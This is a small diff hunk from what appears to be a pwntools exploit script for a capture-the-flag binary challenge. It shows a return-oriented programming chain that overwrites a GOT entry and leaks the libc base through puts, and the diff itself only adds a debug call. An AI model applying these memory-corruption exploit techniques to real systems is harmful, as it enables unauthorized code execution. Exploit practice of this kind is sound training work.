@@ -41,6 +41,7 @@ payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss + 0x50) + p64(0) +
     0x401050) # read str -> write readgot table
 payload += p64(0x4011BE)
 
+ddebug()
 io.sendlineafter("here!\n", payload)
 
 libcbase_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
